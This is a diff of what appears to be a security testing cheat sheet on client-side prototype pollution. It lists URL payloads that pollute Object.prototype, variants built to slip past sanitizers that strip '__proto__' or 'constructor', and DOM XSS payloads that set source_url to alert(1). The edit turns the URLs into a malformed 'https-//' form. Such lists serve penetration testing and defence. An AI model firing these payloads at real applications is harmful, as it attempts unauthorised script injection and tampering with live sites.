@@ -63,12 +63,18 @@ https://example.com/?__proto__.foo=bar
 https://example.com/?constructor.[prototype][foo]=bar
 https://example.com/?constructor.prototype.foo=bar
 # Bypass sanitization
-https://example.com/?__pro__proto__to__[foo]=bar
-https://example.com/?__pro__proto__to__.foo=bar
-https://example.com/?constconstructorructor[prototype][foo]=bar
-https://example.com/?constconstructorructor.prototype.foo=bar
-https://example.com/?constconstructorructor[protoprototypetype][foo]=bar
-https://example.com/?constconstructorructor.protoprototypetype.foo=bar
+https-//example.com/?__pro__proto__to__[foo]=bar`
+
+https-//example.com/?__pro__proto__to__.foo=bar
+
+https-//example.com/?constconstructorructor[prototype][foo]=bar
+
+https-//example.com/?constconstructorructor.prototype.foo=bar
+
+https-//example.com/?constconstructorructor[protoprototypetype][foo]=bar
+
+https-//example.com/?constconstructorructor.protoprototypetype.foo=bar
+
 
 Check in browser
 Object.prototype.foo
@@ -77,8 +83,12 @@ constructor.prototype.foo
 // the expected output: "bar"
 
 # DOM XSS
-https://example.com/?__proto__[source_url]=data:,alert(1);
-https://example.com/?__proto__[source_url]=data:,alert(1);
-https://example.com/?__proto__[source_url]=alert(1)-
+https-//example.com/?__proto__[source_url]=data:,alert(1);
+
+https-//example.com/?__proto__[source_url]=data:,alert(1);
+
+https-//example.com/?__proto__[source_url]=alert(1)-
+
+source_url can be [transport_url]
 
 
